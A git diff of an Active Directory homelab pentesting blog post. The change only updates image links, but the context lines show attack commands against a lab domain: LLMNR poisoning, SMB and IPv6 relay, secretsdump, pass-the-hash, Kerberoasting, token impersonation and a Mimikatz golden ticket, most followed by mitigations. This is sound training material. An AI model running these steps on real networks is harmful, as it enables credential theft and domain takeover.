@@ -8,6 +8,7 @@ date: 2025-08-30
 
 Directory service developed by Microsoft to manage Windows domain networks, stores info related to objects, such as Computers, Users, Printers...
 - Authenticates using Kerberos tickets 
+
 ## Physical AD Components
 
 **Domain Controller :** is a server with the AD DS server role installed that has specifically been promoted to a domain controller
@@ -67,7 +68,7 @@ One service admin : `SQLService`
  
 One user admin account : `tstark`
 
-![](assets/project_structure.jpg)
+![](https://younescodes.github.io/my-blog-site/assets/project_structure.jpg)
 
 ### Initial attack vectors
 
@@ -81,13 +82,13 @@ Link Local Multi-Cast Name Resolution, used to identify hosts when DNS fails to 
 
 **Step 1 :** Run Responder on attacker via `responder -I eth0 -dwv (Listening)`
 
-![](assets/llmnr1.png)
+![](https://younescodes.github.io/my-blog-site/assets/llmnr1.png)
 
 **Step 2 :** An event occurs... (Example : someone typed a wrong network drive, here we simulate it by trying to access //mistake)
 
 **Step 3 :** Get the hash
 
-![](assets/llmnr2.png)
+![](https://younescodes.github.io/my-blog-site/assets/llmnr2.png)
 
 **Step 4 :** Crack the hash using hashcat
 
@@ -111,7 +112,7 @@ Requirements : SMB signing must be disabled on the target ; Relayed user credent
 
 **Step 1:** `nano /usr/share/responder/Responder.conf` and turn off SMB and HTTP
 
-![](assets/relay1.png)
+![](https://younescodes.github.io/my-blog-site/assets/relay1.png)
 
 By default, Responder will happily answer SMB/HTTP requests itself.  
 But for an SMB relay attack, we want Responder to **collect and pass NTLM auth to ntlmrelayx** instead of grabbing hashes.
@@ -125,11 +126,11 @@ But for an SMB relay attack, we want Responder to **collect and pass NTLM auth t
 
 **Step 5 :** Congrats, in this case we dumped local sam hashes including local client2 account hash
 
-![](assets/relay2.png)
+![](https://younescodes.github.io/my-blog-site/assets/relay2.png)
 
 to check if smb signing is disabled - `nmap --script=smb2-security-mode.nse -p445 192.168.1.0/24`
 
-![](assets/signing1.png)
+![](https://younescodes.github.io/my-blog-site/assets/signing1.png)
 
 **Mitigation?** 
 - Enable SMB signing on all devices, completely stops the attack but can cause performance issues with file copies
@@ -157,29 +158,29 @@ Windows clients, even if IPv4-only try to fetch `wpad.dat`. When they do, they s
 
 **Step 1 :** Start ntlmrelayx via : `impacket-ntlmrelayx -6 -t ldaps://192.168.1.100 -wh fakewpad.homelab.local -l lootme`
 
-![](assets/mitm1.png)
+![](https://younescodes.github.io/my-blog-site/assets/mitm1.png)
 
 **Step 2 :**   Start mitm6 via `mitm6 -d homelab.local
 
-![](assets/mitm2.png)
+![](https://younescodes.github.io/my-blog-site/assets/mitm2.png)
 
 **Step 3 :** An event occurs (trigger win10 machine rebooting), boom:
 
-![](assets/mitm3.png)
+![](https://younescodes.github.io/my-blog-site/assets/mitm3.png)
 
 When checking lootme directory:
 
-![](assets/mitm4.png)
+![](https://younescodes.github.io/my-blog-site/assets/mitm4.png)
 
 We get a bunch of files containing information that can help us through our pentest, take for example `domain_users_by_group.html` :
 
-![](assets/mitm5.png)
+![](https://younescodes.github.io/my-blog-site/assets/mitm5.png)
 
 Bingo, someone thought it was a good idea to write their password down in the account description...
 
 Additionnally, if we get an Administrator to log in into a client, ntlmrelayx can create a user account that is in the Entreprise Admins group :
 
-![](assets/mitm6.png)
+![](https://younescodes.github.io/my-blog-site/assets/mitm6.png)
 
 Next we will try to use `impacket-secretsdump` with the credentials of the newly created user as advised in the previous screenshot.
 
@@ -187,8 +188,8 @@ It is a tool for dumping password hashes, Kerberos tickets, and LSA secrets from
 
 Usage : `impacket-secretsdump homelab/eghOfpExwq:'cFW,(qQ@H7^u5PV'@DC01.homelab.local -just-dc`
 
-![](assets/mitm7.png)
-![](assets/mitm8.png)
+![](https://younescodes.github.io/my-blog-site/assets/mitm7.png)
+![](https://younescodes.github.io/my-blog-site/assets/mitm8.png)
 
 Success! We just dumped hashes of practically every user account on the network.
 These include Domain Admin, Administrator, krbtgt, service accounts, user accounts, and machine accounts. 
@@ -252,13 +253,13 @@ The typical workflow begins by getting SharpHound onto a Windows host within the
 
 **Step 1 :** Bypass powershell execution policy : `powershell -ep bypass`
 
-![](assets/blood1.png)
+![](https://younescodes.github.io/my-blog-site/assets/blood1.png)
 
 **Step 2 :** Run either `.ps1` script or `.exe` file
 
 **Step 3 :** Run this command : `Invoke-BloodHound -CollectionMethod All -Domain homelab.local -OutputDirectory C:... -ZipFilename blood.zip`
 
-![](assets/blood2.png)
+![](https://younescodes.github.io/my-blog-site/assets/blood2.png)
 
 After execution, the zip file generated must be exfiltrated back to the attacker’s machine. The attacker then imports this file into the BloodHound GUI, which parses the data and builds a graph-based view of the environment. 
 
@@ -268,15 +269,15 @@ Pre-made queries are helpful to map out the AD environment and help us gather mo
 
 **All domain admins :**
 
-![](assets/blood3.png)
+![](https://younescodes.github.io/my-blog-site/assets/blood3.png)
 
 **Shortest path to domain admin :**
 
-![](assets/blood4.png)
+![](https://younescodes.github.io/my-blog-site/assets/blood4.png)
 
 **All kerberoastable users :**
 
-![](assets/blood5.png)
+![](https://younescodes.github.io/my-blog-site/assets/blood5.png)
 
 BloodHound is powerful because it automates the mapping of large, complicated AD structures. It helps attackers identify paths that are not obvious by manual inspection, such as chained group memberships or cross-domain trusts. 
 ### Post Compromise Attacks
@@ -288,31 +289,31 @@ CrackMapExec is a post-exploitation tool used for assessing Active Directory net
 
 Pass The Password :  `crackmapexec smb <ip/CIDR> -u <user> -d  <domain> -p <pass>`
 
-![](assets/crackmapexec1.png)
+![](https://younescodes.github.io/my-blog-site/assets/crackmapexec1.png)
 
 We can also dump SAM hashes :
 
-![](assets/crackmapexec2.png)
+![](https://younescodes.github.io/my-blog-site/assets/crackmapexec2.png)
 
 Using `impacket-secretsdump` :
 
-![](assets/secretsdump1.png)
+![](https://younescodes.github.io/my-blog-site/assets/secretsdump1.png)
 
 **Attempting to crack hashes using hashcat :** 
 `hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`
 Result (cracked 2 out of 3 hashes, first is an empty password):
 
-![](assets/hashcat1.png)
+![](https://younescodes.github.io/my-blog-site/assets/hashcat1.png)
 
 Pass The Hash :  `crackmapexec smb <ip/CIDR> -u <user>  -H <hash> --local-auth`
 
-![](assets/crackmapexec3.png) 
+![](https://younescodes.github.io/my-blog-site/assets/crackmapexec3.png) 
 
 (Green plus sign / pwned  indicates good chance/successful attempt) 
 
 **Attempting to get a shell using psexec :** (proof of concept)
 
-![](assets/psexec1.png)
+![](https://younescodes.github.io/my-blog-site/assets/psexec1.png)
 
 **Mitigation?**
 Hard to completely prevent but we can make it more difficult on an attacker  .
@@ -353,28 +354,28 @@ Impersonate is non-interactive such as attaching a network drive or a domain log
 
 **Step 1 :** Run meterpreter session
 
-![](assets/meterpreter2.png)
-![](assets/meterpreter1.png)
+![](https://younescodes.github.io/my-blog-site/assets/meterpreter2.png)
+![](https://younescodes.github.io/my-blog-site/assets/meterpreter1.png)
 
 **Step 2 :** load incognito
 
-![](assets/incognito1.png)
+![](https://younescodes.github.io/my-blog-site/assets/incognito1.png)
 
 **Step 3 :** List available tokens 
 
-![](assets/incognito2.png)
+![](https://younescodes.github.io/my-blog-site/assets/incognito2.png)
 
 **Step 4 :** Impersonate Administration token
 
-![](assets/incognito3.png)
+![](https://younescodes.github.io/my-blog-site/assets/incognito3.png)
 
 **Note :** you cannot run hashdump when impersonating administrator token, run `rev2self`
 
-![](assets/incognito4.png)
+![](https://younescodes.github.io/my-blog-site/assets/incognito4.png)
 
 Works with other users tokens :
 
-![](assets/incognito5.png)
+![](https://younescodes.github.io/my-blog-site/assets/incognito5.png)
 
 **Mitigation?**
 
@@ -385,19 +386,19 @@ Works with other users tokens :
 
 #### Kerberoasting :
 
-![](assets/kerber1.png)
+![](https://younescodes.github.io/my-blog-site/assets/kerber1.png)
 **TGT :** ticket granting ticket
 
 **TGS :** ticket granting service ticket
 
-![](assets/kerber2.png)
+![](https://younescodes.github.io/my-blog-site/assets/kerber2.png)
 
-![](assets/kerber3.png)
+![](https://younescodes.github.io/my-blog-site/assets/kerber3.png)
 
 Let's try it on our lab:
 `impacket-GetUserSPNs homelab.local/petep:password1$ -dc-ip 192.168.1.100 -request`
 
-![](assets/kerber4.png)
+![](https://younescodes.github.io/my-blog-site/assets/kerber4.png)
 
 Then we can attempt to crack it using hashcat :
 `hashcat -m 13100 kerbhash.txt /usr/share/wordlists/rockyou.txt
@@ -427,7 +428,7 @@ The attacker places this "@xxxxxxx.url" file in a network share that the victim 
 
 On the attacker side, Responder or a similar tool is running to capture the NTLM authentication attempt made by the victim’s machine. This results in the attacker obtaining the victim’s NTLMv2 hash, which can then be cracked offline or relayed, making it an easy but effective method of credential harvesting in Windows environments.
 
-![](assets/urlfile4.png)
+![](https://younescodes.github.io/my-blog-site/assets/urlfile4.png)
 
 #### Mimikatz : An Overview
 
@@ -456,15 +457,15 @@ If `privilege::debug` fails, most of the powerful functions in Mimikatz won’t 
 
 This makes it one of the most powerful and commonly used functions in Mimikatz, since it directly provides the attacker with credentials that can be used for lateral movement, privilege escalation, or persistence within a network.
 
-![](assets/mimi2.png)
+![](https://younescodes.github.io/my-blog-site/assets/mimi2.png)
 
 Attempt at trying to dump SAM :
 
-![](assets/mimi3.png)
+![](https://younescodes.github.io/my-blog-site/assets/mimi3.png)
 
 Dumping LSA : Usernames and NTLM hashes
 
-![](assets/mimi4.png)
+![](https://younescodes.github.io/my-blog-site/assets/mimi4.png)
 
 **Golden ticket attack  + pass the ticket:**
 
@@ -476,7 +477,7 @@ These tickets can be customized to never expire or be reissued, giving the attac
 
 Executing this command :
 
-![](assets/gt1.png)
+![](https://younescodes.github.io/my-blog-site/assets/gt1.png)
 
 We have to write some info down :
 
@@ -491,13 +492,13 @@ That command tells Mimikatz to forge and immediately inject (`/ptt` : pass the t
 
 In short, this command creates a valid-looking Kerberos TGT for the domain Administrator and loads it into memory so the attacker can act as that account.
 
-![](assets/gt2.png)
+![](https://younescodes.github.io/my-blog-site/assets/gt2.png)
 
 Following that with `misc::cmd` spawns a new command shell that inherits this authentication context. The result is that the new cmd.exe can immediately access domain resources like file shares, servers, or even remote administration tools using the forged Administrator ticket, effectively giving you a working shell as a domain admin without needing the real password.
 
 We can access any share we want on the network, like in the screenshot below where we accessed the C$ share of CLIENT-WIN10 :
 
-![](assets/gt3.png)
+![](https://younescodes.github.io/my-blog-site/assets/gt3.png)
 
 We can also use the windows tool of psexec to get direct access to the machine via the command :
 `psexec.exe \\client-win10 cmd.exe ` popping a shell
